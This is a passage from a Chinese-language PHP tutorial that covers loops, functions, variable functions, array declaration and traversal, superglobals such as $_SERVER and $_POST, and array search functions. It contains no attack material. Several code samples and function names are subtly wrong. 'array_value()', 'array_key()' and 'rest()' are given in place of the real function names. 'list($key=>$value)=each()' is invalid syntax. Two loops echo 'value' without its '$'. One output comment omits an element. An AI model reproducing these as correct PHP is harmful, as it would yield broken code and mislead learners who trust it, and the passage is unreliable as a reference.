<h3 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">do&#123;</div><div class="line">	语句块;</div><div class="line">&#125;while(表达式);</div></pre></td></tr></table></figure>
<h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for(初始化:条件表达式; 增量)&#123;</div><div class="line">	语句块;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="PHP中的函数"><a href="#PHP中的函数" class="headerlink" title="PHP中的函数"></a>PHP中的函数</h2><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">function 函数名 ([参数1, 参数2,... 参数n])</div><div class="line">&#123;</div><div class="line">	函数体;</div><div class="line">	return 返回值;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="参数的传递"><a href="#参数的传递" class="headerlink" title="参数的传递"></a>参数的传递</h3><ul>
<li><p>按值传递参数<br>通过参数列表传递信息到函数</p>
</li>
<li><p>按引用传递参数<br>在参数的面前预先加上符号“&amp;”即可</p>
</li>
<li><p>函数的默认参数</p>
</li>
<li><p>可变长度参数列表<br>使用func_get_args()函数将所有传递给脚本函数的参数当做一个数组返回<br>也可以使用func_num_args()函数返回参数的总数，和使用func_get_arg()函数接收一个数字参数，返回指定的函数。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	function more_args()&#123;</div><div class="line">		$args=func_get_args();</div><div class="line">	for($i=0;$i&lt;count($args);$i++)&#123;</div><div class="line">		echo &quot;第&quot;.$i.&quot;个参数是&quot;.$args[$i].&quot;&lt;br&gt;&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	more_args(&quot;one&quot;,&quot;two&quot;,&quot;three&quot;,1,2,3);</div><div class="line">?&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;?php</div><div class="line">	function more_args()&#123;</div><div class="line">	for($i=0;$i&lt;func_num_args();$i++)&#123;</div><div class="line">		echo &quot;第&quot;.$i.&quot;个参数是&quot;.func_get_arg($i).&quot;&lt;br&gt;&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	more_args(&quot;one&quot;,&quot;two&quot;,&quot;three&quot;,1,2,3);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="变量函数"><a href="#变量函数" class="headerlink" title="变量函数"></a>变量函数</h3><p>变量函数也称作可变函数。如果一个变量名后有圆括号，PHP将寻找与变量的值同名的函数，并且将尝试执行它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	function one($a,$b)&#123;</div><div class="line">	return $a+$b;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	$result=&quot;one&quot;;</div><div class="line">	echo &quot;通算结果是：&quot;.$result(2,3);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h1 id="PHP中的数组与数据结构"><a href="#PHP中的数组与数据结构" class="headerlink" title="PHP中的数组与数据结构"></a>PHP中的数组与数据结构</h1><h2 id="数组的概述"><a href="#数组的概述" class="headerlink" title="数组的概述"></a>数组的概述</h2><h3 id="数组的分类"><a href="#数组的分类" class="headerlink" title="数组的分类"></a>数组的分类</h3><p>在PHP中，根据数组提供下标的不同方式，将数组分为索引数组和关联数组</p>
<ul>
<li>索引数组的索引值是整数</li>
<li>关联数组的索引值是字符串</li>
</ul>
<h2 id="数组的定义"><a href="#数组的定义" class="headerlink" title="数组的定义"></a>数组的定义</h2><h3 id="直接复制的方式声明数组"><a href="#直接复制的方式声明数组" class="headerlink" title="直接复制的方式声明数组"></a>直接复制的方式声明数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$数组变量名[索引值]=资料内容</div></pre></td></tr></table></figure>
<p>可以使用print_r()或者var_dump()函数打印数组中所有元素的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">print_r($contact1);			//输出数组$contact1中所有元素的下标和值</div><div class="line">var_dump($contact1);		//输出数组$contact1中所有元素的下标和值，同时输出每个元素的类型</div></pre></td></tr></table></figure>
<p>在声明数组变量时，还可以在下标中使用数字和字符串混合。<br>在PHP中，索引数组的下标可以是非连续的值，只要在初始化时指定非连续的下标即可。如果指定的下标志已经声明过，则属于对变量重新赋值。如果没有指定索引值的元素与指定索引值的元素混在一起赋值时，没有指定索引值的元素的默认索引值，将紧跟指定索引值元素中的最高的索引值递增，</p>
<h3 id="使用array-语言结构新建数组"><a href="#使用array-语言结构新建数组" class="headerlink" title="使用array()语言结构新建数组"></a>使用array()语言结构新建数组</h3><p>语法格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$数组变量名=array(key1=&gt;value,key2=&gt;value, ... ... keyN=&gt;valueN);</div></pre></td></tr></table></figure></p>
<h3 id="多维数组的声明"><a href="#多维数组的声明" class="headerlink" title="多维数组的声明"></a>多维数组的声明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">       //使用array()语句结构将联系人列表中所有数据声明为一个二维数组，默认下标是顺序数字索引</div><div class="line">$contact = array(                                                     //定义外层数组</div><div class="line">	   array(1, &apos;高某&apos;, &apos;A公司&apos;, &apos;北京市&apos;, &apos;(010)98765432&apos;, &apos;gm@linux.com&apos;),   //子数组1</div><div class="line">	   array(2, &apos;洛某&apos;, &apos;B公司&apos;, &apos;上海市&apos;, &apos;(021)12345678&apos;, &apos;lm@apache.com&apos;),  //子数组2</div><div class="line">	   array(3, &apos;峰某&apos;, &apos;C公司&apos;, &apos;天津市&apos;, &apos;(022)24680246&apos;, &apos;fm@mysql.com&apos;),   //子数组3</div><div class="line">	   array(4, &apos;书某&apos;, &apos;D公司&apos;, &apos;重庆市&apos;, &apos;(023)13579135&apos;, &apos;sm@phpcom&apos;)       //子数组4</div><div class="line">   );</div></pre></td></tr></table></figure>
<h2 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h2><h3 id="使用for语句循环遍历数组"><a href="#使用for语句循环遍历数组" class="headerlink" title="使用for语句循环遍历数组"></a>使用for语句循环遍历数组</h3><p>在PHP中，不仅可以指定非连续的数字索引值，而且还存在以字符串为下标的关联数组。所以在PHP中很少使用for语句循环遍历数组。</p>
<h3 id="使用foreach语句遍历数组"><a href="#使用foreach语句遍历数组" class="headerlink" title="使用foreach语句遍历数组"></a>使用foreach语句遍历数组</h3><ul>
<li>第一种语法格式：<br>每次循环中，当前元素的值被赋给变量$value($value可以是自定义的任意变量)，并且把数组内部的指针向后移动一步，因此下一次循环中将会得到该数组的下一个元素，只要数组的结尾停止循环，结束数组的遍历。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">foreach(array_expression as $value)&#123;</div><div class="line">	循环体</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">&lt;?php</div><div class="line">        //使用array()结构声明一个无序的一维数组$contact</div><div class="line">	$contact = array( 1, 14=&gt;&quot;高某&quot;, &quot;A公司&quot;, &quot;北京市&quot;, 14=&gt;&quot;(010)98765432&quot;, &quot;gao@php.com&quot; );</div><div class="line">	$num=0;                                                       //声明一个变量$num初使值为0，做为循环的计数使用</div><div class="line">        //使用foreach语句遍历一维数组$contact，将数组中每个元素输出</div><div class="line">	foreach($contact as $value)&#123;</div><div class="line">		echo &quot;在数组\$contact中第 $num 元素是：$value &lt;br&gt;&quot;;  //每次循环输出一次当前元素</div><div class="line">		$num++;                                               //计数变量累加</div><div class="line">	&#125;</div><div class="line">?&gt;</div><div class="line"></div><div class="line">在数组$contact中第 0 元素是：1</div><div class="line">在数组$contact中第 1 元素是：(010)98765432</div><div class="line">在数组$contact中第 2 元素是：A公司</div><div class="line">在数组$contact中第 3 元素是：北京市</div><div class="line">在数组$contact中第 4 元素是：gao@php.com</div></pre></td></tr></table></figure>
<ul>
<li>第二种语法格式<br>当前元素的键名和值都会被赋给变量$key和$value<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">foreach(array_expression as $key=&gt;$value)&#123;</div><div class="line">	循环体</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">        //声明一个一维的关联数组$contact, 使用“=&gt;”运算符指定了每个元素的字符串下标</div><div class="line">	$contact = array(&quot;ID&quot; =&gt; 1,</div><div class="line">		&quot;姓名&quot; =&gt; &quot;高某&quot;,</div><div class="line">		&quot;公司&quot; =&gt; &quot;A公司&quot;,</div><div class="line">		&quot;地址&quot; =&gt; &quot;北京市&quot;,</div><div class="line">		&quot;电话&quot; =&gt; &quot;(010)98765432&quot;,</div><div class="line">		&quot;EMAIL&quot; =&gt; &quot;gao@php.com&quot; </div><div class="line">	);</div><div class="line">	//以HTML列表的方式输出数组中每个元素的信息</div><div class="line">	echo &apos;&lt;dl&gt;一个联系人信息：&apos;;</div><div class="line">	foreach($contact as $key =&gt; $value)&#123;       //使用foreach的第二种格式，可以获取数组元素的键/值</div><div class="line">		echo &quot;&lt;dd&gt; $key : $value &lt;/dd&gt;&quot;;   //输出每个元素的键/值对</div><div class="line">	&#125;</div><div class="line">	echo &apos;&lt;/dl&gt;&apos;;</div><div class="line">?&gt;</div><div class="line"></div><div class="line">一个联系人信息：</div><div class="line">    ID : 1 </div><div class="line">    姓名 : 高某 </div><div class="line">    公司 : A公司 </div><div class="line">    地址 : 北京市 </div><div class="line">    电话 : (010)98765432 </div><div class="line">    EMAIL : gao@php.com</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="联合使用list-、each-和while-循环遍历数组"><a href="#联合使用list-、each-和while-循环遍历数组" class="headerlink" title="联合使用list()、each()和while()循环遍历数组"></a>联合使用list()、each()和while()循环遍历数组</h3><ul>
<li><p>each()函数<br>each()函数需要传递一个数组作为参数，返回数组中当前元素的键/值对，并向后移动数组指针到下一个元素的位置。</p>
</li>
<li><p>list()函数<br>list()用一步操作给一组变量进行赋值，即把数组中的值赋给一些变量。list()仅能用与数字索引从0开始。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list(mixed varname,mixed ...)=array_expression     //list()语句的语法格式</div></pre></td></tr></table></figure>
<p>list()是通过“=”运算符以赋值的方式，将数组中每个元素的值，对应的赋给list()函数中的每个参数。list()函数又将它中的每个参数转换成直接可以在脚本中使用的比变量。</p>
<ul>
<li>each()和list()结合<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$contact=array(&quot;ID&quot;=&gt;1,&quot;名字&quot;=&gt;&quot;高某&quot;,&quot;公司&quot;=&gt;&quot;A&quot;);</div><div class="line">	list($key=&gt;$value)=each($contact);</div><div class="line">	echo &quot;$key=&gt;$value&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用数组的内部指针控制函数遍历数组"><a href="#使用数组的内部指针控制函数遍历数组" class="headerlink" title="使用数组的内部指针控制函数遍历数组"></a>使用数组的内部指针控制函数遍历数组</h3><p>数组的内部指针是数组内部的组织机制，指向一个数组中的某个元素，默认是指向数组中第一个元素，通过移动或改变指针的位置，可以访问数组中的任意元素。<br>对于数组指针的控制PHP提供以下几个内建函数可以利用。</p>
<ul>
<li>current():是取得目前指针位置的内容资料</li>
<li>key():用来读取目前指针所指向资料的索引值</li>
<li>next():将数组中的内部指针移动到下一个单元</li>
<li>prev():将数组的内部指针倒回一位</li>
<li>end():将数组的内部指针指向最后一个元素</li>
<li>rest():将目前指针无条件移至第一个索引位置</li>
</ul>
<h2 id="预定义数组"><a href="#预定义数组" class="headerlink" title="预定义数组"></a>预定义数组</h2><table>
<thead>
<tr>
<th>预定义数组</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_SERVER</td>
<td style="text-align:left">变量由Web服务器设定或者直接与当前脚本的执行环境相关联</td>
</tr>
<tr>
<td>$_ENV</td>
<td style="text-align:left">执行环境提交至脚本的变量</td>
</tr>
<tr>
<td>$_GET</td>
<td style="text-align:left">经由URL请求提交至脚本的变量</td>
</tr>
<tr>
<td>$_POST</td>
<td style="text-align:left">经由HTTP POST方法提交至脚本的变量</td>
</tr>
<tr>
<td>$_REQUEST</td>
<td style="text-align:left">经由GET,POST和COOKIE机制提交至脚本的变量，因此该数组并不值得信任</td>
</tr>
<tr>
<td>$_FILES</td>
<td style="text-align:left">经由HTTP POST文件上传而提交至脚本的变量</td>
</tr>
<tr>
<td>$_COOKIE</td>
<td style="text-align:left">经由HTTP Cookies方法提交至脚本的变量</td>
</tr>
<tr>
<td>$_SESSION</td>
<td style="text-align:left">当前注册给脚本会话的变量</td>
</tr>
<tr>
<td>$GLOBALS</td>
<td style="text-align:left">包含一个引用指向每个当前脚本的全局范围内有效的变量。该数组的键名为全局变量的名称</td>
</tr>
</tbody>
</table>
<h3 id="服务器变量：-SERVER"><a href="#服务器变量：-SERVER" class="headerlink" title="服务器变量：$_SERVER"></a>服务器变量：$_SERVER</h3><p>$_SERVER是一个包含诸如头信息，路径和脚本位置的数组。这是自动全局变量，在所有的脚本中都有效，在函数或对象的方法中不需要使用global关键字访问它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	foreach($_SERVER as $key=&gt;$value)&#123;</div><div class="line">		echo &apos;$_SERVER[&apos;.$key.&apos;]=&apos;.value.&apos;&lt;br&gt;&apos;;</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="环境变量：-ENV"><a href="#环境变量：-ENV" class="headerlink" title="环境变量：$_ENV"></a>环境变量：$_ENV</h3><p>$_ENV数组中的内容是在PHP解析器运行是，从PHP所在服务器中的环境变量转变为PHP全局变量的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	foreach($_ENV as $key=&gt;$value)&#123;</div><div class="line">		echo &apos;$_ENV[&apos;.$key.&apos;]=&apos;.value.&apos;&lt;br&gt;&apos;;</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>###　HTTP GET变量：$_GET<br>$_GET数组也是超全局变量数组，是通过HTTP GET方法传递的变量组成的数组。它属于外部变量，即在服务器页面中通过$_GET超全局数组获取URL或表单的GET方式传递过来的参数。</p>
<h3 id="HTTP-POST变量：-POST"><a href="#HTTP-POST变量：-POST" class="headerlink" title="HTTP POST变量：$_POST"></a>HTTP POST变量：$_POST</h3><p>$_POST数组也是超全局变量数组，通过HTTP POST方法传递的变量组成的数组，是自动全局变量，在所有的脚本中都有效，在函数或对象的方法也不需要使用global关键字访问它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">	&lt;head&gt;&lt;title&gt;添加联系人&lt;/title&gt;&lt;/head&gt;</div><div class="line">	&lt;body&gt;</div><div class="line">		&lt;form action=&quot;add.php&quot; method=&quot;post&quot;&gt; &lt;!--将表单以POST方法提交到add.php页面 --&gt;</div><div class="line">			编号：&lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;&lt;br&gt;        &lt;!-- 表单域的名称为id --&gt;</div><div class="line">			姓名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;      &lt;!-- 表单域的名称为name --&gt;</div><div class="line">			公司：&lt;input type=&quot;text&quot; name=&quot;company&quot;&gt;&lt;br&gt;   &lt;!-- 表单域的名称为company --&gt;</div><div class="line">			地址：&lt;input type=&quot;text&quot; name=&quot;address&quot;&gt;&lt;br&gt;   &lt;!-- 表单域的名称为address --&gt;</div><div class="line">			电话：&lt;input type=&quot;text&quot; name=&quot;phone&quot;&gt;&lt;br&gt;     &lt;!-- 表单域的名称为phone --&gt;</div><div class="line">			EMAIL:&lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;br&gt;     &lt;!-- 表单域的名称为email --&gt;</div><div class="line">			&lt;input type=&quot;submit&quot; value=&quot;添加新联系人&quot;&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">&lt;?php</div><div class="line">	echo &quot;用户添加的联系人信息如下：&lt;br&gt;&quot;;</div><div class="line">	foreach($_POST as $key =&gt; $value) &#123; 		  //使用foreach语句遍历超全局数组$_POST</div><div class="line">		echo $key.&apos; : &apos;.$value.&apos;&lt;br&gt;&apos;;     	  //输出$_POST数组中的键和值，键即是表单域的名称</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="request变量：-REQUEST"><a href="#request变量：-REQUEST" class="headerlink" title="request变量：$_REQUEST"></a>request变量：$_REQUEST</h3><p>此关联数组包含$_GET，$_POST和$_COOKIE中的全部内容。不管是POST还是GET方法提交的所有数据都可以通过$_REQUEST获得。但是$_REQUEST的速度比较慢。</p>
<h3 id="HTTP文件上传变量：-FILES"><a href="#HTTP文件上传变量：-FILES" class="headerlink" title="HTTP文件上传变量：$_FILES"></a>HTTP文件上传变量：$_FILES</h3><p>使用表单的file输入域上传文件时，必须使用POST提交。</p>
<h3 id="HTTP-Cookies：-COOKIE"><a href="#HTTP-Cookies：-COOKIE" class="headerlink" title="HTTP Cookies：$_COOKIE"></a>HTTP Cookies：$_COOKIE</h3><p>$_COOKIE超全局数组是经由HTTP Cookies方法提交至脚本的变量。</p>
<h3 id="Session变量：-SESSION"><a href="#Session变量：-SESSION" class="headerlink" title="Session变量：$_SESSION"></a>Session变量：$_SESSION</h3><p>在PHP5中，会话控制是在服务器端使用session跟踪用户。</p>
<h3 id="Global变量：-GLOBALS"><a href="#Global变量：-GLOBALS" class="headerlink" title="Global变量：$_GLOBALS"></a>Global变量：$_GLOBALS</h3><p>GLOBALS是由所有已定义的全局变量组成的数组，变量名就是该数组的索引。</p>
<h2 id="数组的相关处理函数"><a href="#数组的相关处理函数" class="headerlink" title="数组的相关处理函数"></a>数组的相关处理函数</h2><h3 id="数组的键-值操作函数"><a href="#数组的键-值操作函数" class="headerlink" title="数组的键/值操作函数"></a>数组的键/值操作函数</h3><p>在PHP中，数组的每个元素都是由键/值对组成，通过元素的键来访问对应键的值。</p>
<h4 id="函数array-value"><a href="#函数array-value" class="headerlink" title="函数array_value()"></a>函数array_value()</h4><p>array_value()函数的作用是返回数组中所有元素的值。使用非常容易，只有一个必选参数，规定传入给定的数组，返回一个包含给定数组中所有值的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$contact = array(&quot;ID&quot; =&gt; 1,</div><div class="line">		&quot;姓名&quot; =&gt; &quot;高某&quot;,</div><div class="line">		&quot;公司&quot; =&gt; &quot;A公司&quot;,</div><div class="line">		&quot;地址&quot; =&gt; &quot;北京市&quot;,</div><div class="line">		&quot;电话&quot; =&gt; &quot;(010)98765432&quot; );</div><div class="line">	</div><div class="line">	print_r(array_values($contact));   // array_values()函数传入数组$contact重新索引返回一个新数组</div><div class="line">	print_r($contact);                 //原数组$contact内容元素不变</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="函数array-key"><a href="#函数array-key" class="headerlink" title="函数array_key()"></a>函数array_key()</h4><p>array_key()函数的作用是返回数组所有的键名。本函数中有一个必需参数和两个可选参数，其中函数的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array array_key(array input[,mixed search_value[,bool strict]])</div></pre></td></tr></table></figure></p>
<p>如果指定了可选参数search_value，则只返回指定该值的键名，否则input数组中的所有键名都会被返回，自PHP5起，可以用strict参数来进行全等比较。需要传入一个布尔型的值，FALSE为默认不依赖类型。如果传入TRUE值则根据类型返回带有指定值的键名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">     $lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;,&quot;c&quot;=&gt;&quot;MySQL&quot;,&quot;d&quot;=&gt;&quot;PHP&quot;);  //只使第一个必需的参数</div><div class="line">	print_r(array_keys($lamp));            //输出：Array ( [0] =&gt; a [1] =&gt; b [2] =&gt; c )</div><div class="line">	print_r(array_keys($lamp,&quot;Apache&quot;));   //使用第二个可选参数输出：Array ( [0] =&gt; b)</div><div class="line"></div><div class="line">	$a=array(10,20,30,&quot;10&quot;);               //声明一个数组，其中元素的值有整数10和字符串”10”</div><div class="line">	print_r(array_keys($a,&quot;10&quot;,false));    //使用第三个参数 (false)输出：Array ( [0] =&gt; 0 [1] =&gt; 3 )</div><div class="line">	</div><div class="line">	$a=array(10,20,30,&quot;10&quot;);               //声明一个数组，其中元素的值有整数10和字符串”10”</div><div class="line">	print_r(array_keys($a,&quot;10&quot;,true));     //使用第三个参数 (true)输出：Array ( [0] =&gt; 3)	</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="函数in-array"><a href="#函数in-array" class="headerlink" title="函数in_array()"></a>函数in_array()</h4><p>in_array()函数的作用是检查数组中是否存在某个值，即在数组中搜索给定的值。本函数中有三个参数，前两个参数为必需的，最后一个参数为可选的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool in_array(mixed needle,array haystack[,bool strict])</div></pre></td></tr></table></figure></p>
<p>第一个参数needle为规定要在数组中搜索的值，第二个参数haystack是规定要被搜索的数组，如果给定的值needle存在与数组haystack中则返回TRUE，函数只有在元素存在于数组且数据类型与给定相同时才返回TRUE。如果没有在数组中找到参数，函数返回FALSE。要注意如果needle参数是字符串，且strict参数设置为TRUE，则搜索区分大小写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">        //in_array()函数的简单使用形式</div><div class="line">	$os = array(&quot;Mac&quot;, &quot;NT&quot;, &quot;Irix&quot;, &quot;Linux&quot;);</div><div class="line">		</div><div class="line">	if (in_array(&quot;Irix&quot;, $os)) &#123;       //这个条件成立，字符串Irix在数组$os中</div><div class="line">    		echo &quot;Got Irix&quot;;</div><div class="line">	&#125;</div><div class="line">	if (in_array(&quot;mac&quot;, $os)) &#123;        //这个条件失败，因为 in_array()是区分大小写的</div><div class="line">    		echo &quot;Got mac&quot;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	//in_array() 严格类型检查例子</div><div class="line">	$a = array(&apos;1.10&apos;, 12.4, 1.13);</div><div class="line"></div><div class="line">	if (in_array(&apos;12.4&apos;, $a, true)) &#123;  //第三个参数为true，所以字符串&apos;12.4&apos;和浮点数12.4类型不同</div><div class="line">		echo &quot;&apos;12.4&apos; found with strict check\n&quot;;</div><div class="line">	&#125;</div><div class="line">	if (in_array(1.13, $a, true)) &#123;   //这个条件成立，执行下面的语句</div><div class="line">   		 echo &quot;1.13 found with strict check\n&quot;;</div><div class="line">	&#125; </div><div class="line"></div><div class="line">	//in_array()中还可以用数组当作第一个参数作为查询条件</div><div class="line">	$a = array(array(&apos;p&apos;, &apos;h&apos;), array(&apos;p&apos;, &apos;r&apos;), &apos;o&apos;);</div><div class="line"></div><div class="line">	if (in_array(array(&apos;p&apos;, &apos;h&apos;), $a)) &#123;   //数组array(&apos;p&apos;, &apos;h&apos;)在数组$a中存在</div><div class="line">  		  echo &quot;&apos;ph&apos; was found\n&quot;;</div><div class="line">	&#125;</div><div class="line">	if (in_array(array(&apos;h&apos;, &apos;p&apos;), $a)) &#123;   //数组array(&apos;h&apos;, &apos;p&apos;)不存在数组$a中</div><div class="line">   		 echo &quot;&apos;hp&apos; was found\n&quot;;</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>也可以使用array_search()函数进行检索。该函数与in_array()的参数相同，搜索给定的值存在则返回相应的键名，也支持对数据类型的严格判断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;,&quot;c&quot;=&gt;&quot;MySQL&quot;,&quot;d&quot;=&gt;&quot;PHP&quot;);  </div><div class="line">	echo array_search(&quot;PHP&quot;,$lamp);  //输出：d  （在数组$lamp中，存在字符串&quot;php&quot;则输出下标d）</div><div class="line"></div><div class="line">	$a=array(&quot;a&quot;=&gt;&quot;8&quot;,&quot;b&quot;=&gt;8,&quot;c&quot;=&gt;&quot;8&quot;);</div><div class="line">	echo array_search(8,$a,true);   //输出：b （严格按类型检索，整型8对应的下标为b）</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>使用array_key_exists()函数还可以检查给定的键名或者索引是否存在于数组中。因为一个数组中键名必须是唯一的，所以不需要对其数据类型进行判断。也可以使用isset()函数完成对数组中的键名或者索引进行检查，但isset()对数组中为NULL的值不会返回TRUE，而array_key_exists()会。</p>
